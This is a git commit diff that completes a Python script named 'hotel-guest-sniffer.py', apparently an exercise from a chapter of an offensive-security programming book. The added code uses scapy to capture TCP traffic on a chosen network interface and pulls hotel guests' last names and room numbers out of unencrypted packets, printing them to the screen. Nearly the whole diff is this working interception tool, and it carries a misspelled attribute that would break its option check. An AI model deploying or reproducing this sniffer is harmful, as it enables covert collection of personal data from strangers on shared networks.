28e98df9e8b7c968198521159f9f20137f16d9ec
aleksa <zabumaphu@gmail.com>
2023-06-24 22:41:23 -0400

    Hotel guest sniffer finished.

--- ch5/hotel-guest-sniffer.py
+++ ch5/hotel-guest-sniffer.py
@@ -12,10 +12,28 @@ def findGuest(pkt):
     Analyizes packet and prints guest information to screen.
     """
 
-    pass
+    raw = pkt.sprintf('%Raw.load%')
+    name = re.findall('(?i)LAST_NAME=(.*)&', raw)
+    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
+
+    if name:
+        print('[+] Found Hotel Guest ' + str(name[0] + ', Room # ' + str(room[0])))
 
 def main():
-    pass
+    
+    parser = optparse.OptionParser('usage %prog ' + '-i interface')
+    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
+    (options, args) = parser.parse_args()
+    if options.interaface == None:
+        print(parser.usage)
+        exit(0)
+    else:
+        conf.iface = options.interface
+    try:
+        print('[*] Starting hotel guest sniffer.')
+        sniff(filter='tcp', prn=findGuest, store=0)
+    except KeyboardInterrupt:
+        exit(0)
 
 if __name__ == '__main__':
-    pass
+    main()
